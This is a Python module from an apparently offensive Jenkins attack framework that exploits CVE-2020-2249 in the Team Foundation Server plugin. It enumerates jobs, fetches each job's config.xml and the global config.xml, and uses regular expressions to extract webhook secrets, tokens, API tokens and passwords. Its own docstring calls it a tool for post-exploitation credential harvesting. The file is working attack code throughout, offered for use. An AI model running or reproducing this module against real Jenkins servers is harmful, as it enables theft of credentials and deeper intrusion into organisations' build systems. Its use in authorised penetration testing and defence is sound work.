"""
CVE-2020-2249: Jenkins Team Foundation Server Plugin Credential Exposure

This vulnerability allows reading unencrypted webhook secrets from Jenkins configuration
files. Useful for post-exploitation credential harvesting.
"""

import re
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2020_2249(ExploitModule):
    """TFS Plugin unencrypted webhook secret storage allowing credential extraction."""

    CVE_ID = "CVE-2020-2249"

    METADATA = ExploitMetadata(
        cve_id="CVE-2020-2249",
        name="Jenkins TFS Plugin Credential Exposure",
        description="Unencrypted webhook secret storage allowing credential extraction",
        affected_versions=["TFS Plugin <= 5.157.0"],
        mitre_attack=["T1552", "T1552.001", "T1555"],
        severity="medium",
        references=[
            "https://www.jenkins.io/security/advisory/2020-09-16/",
            "https://nvd.nist.gov/vuln/detail/CVE-2020-2249",
            "https://advisories.gitlab.com/pkg/maven/org.jenkins-ci.plugins/tfs/CVE-2020-2249"
        ],
        requires_auth=True,
        requires_crumb=False,
        tags=["credential-exposure", "post-exploitation", "secrets"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance has TFS plugin installed.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if TFS plugin detected, False otherwise
        """
        try:
            response = session.get("/pluginManager/api/json?depth=1")

            if response.status_code == 200:
                data = response.json()
                plugins = data.get('plugins', [])

                for plugin in plugins:
                    if 'tfs' in plugin.get('shortName', '').lower():
                        return True

            return False
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2020-2249 to extract TFS webhook secrets.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            ExploitResult: Result of the exploit
        """
        extracted_secrets = []

        try:
            response = session.get("/api/json?tree=jobs[name]")

            job_names = []
            if response.status_code == 200:
                data = response.json()
                job_names = [job['name'] for job in data.get('jobs', [])]
        except Exception:
            job_names = []

        for job_name in job_names:
            try:
                config_url = f"/job/{job_name}/config.xml"
                response = session.get(config_url)

                if response.status_code == 200:
                    xml_content = response.text

                    tfs_patterns = [
                        r'<webhookSecret>([^<]+)</webhookSecret>',
                        r'<tfsSecret>([^<]+)</tfsSecret>',
                        r'<secret>([^<]+)</secret>',
                        r'<token>([^<]+)</token>',
                    ]

                    for pattern in tfs_patterns:
                        matches = re.findall(pattern, xml_content, re.IGNORECASE)
                        for match in matches:
                            if match and match not in [s['value'] for s in extracted_secrets if 'value' in s]:
                                extracted_secrets.append({
                                    "job": job_name,
                                    "type": "webhook_secret",
                                    "value": match[:20] + "..." if len(match) > 20 else match
                                })

            except Exception:
                pass

        try:
            response = session.get("/config.xml")

            if response.status_code == 200:
                xml_content = response.text

                secret_patterns = [
                    r'<webhookSecret>([^<]+)</webhookSecret>',
                    r'<apiToken>([^<]+)</apiToken>',
                    r'<password>([^<]+)</password>',
                ]

                for pattern in secret_patterns:
                    matches = re.findall(pattern, xml_content, re.IGNORECASE)
                    for match in matches:
                        if match and len(match) > 5:
                            extracted_secrets.append({
                                "location": "global_config",
                                "type": "secret",
                                "value": match[:20] + "..." if len(match) > 20 else match
                            })

        except Exception:
            pass

        if extracted_secrets:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="success",
                details=f"Extracted {len(extracted_secrets)} unencrypted secrets",
                data={
                    "secrets_count": len(extracted_secrets),
                    "secrets": extracted_secrets
                }
            )
        else:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="failure",
                details="No unencrypted secrets found in accessible configurations"
            )
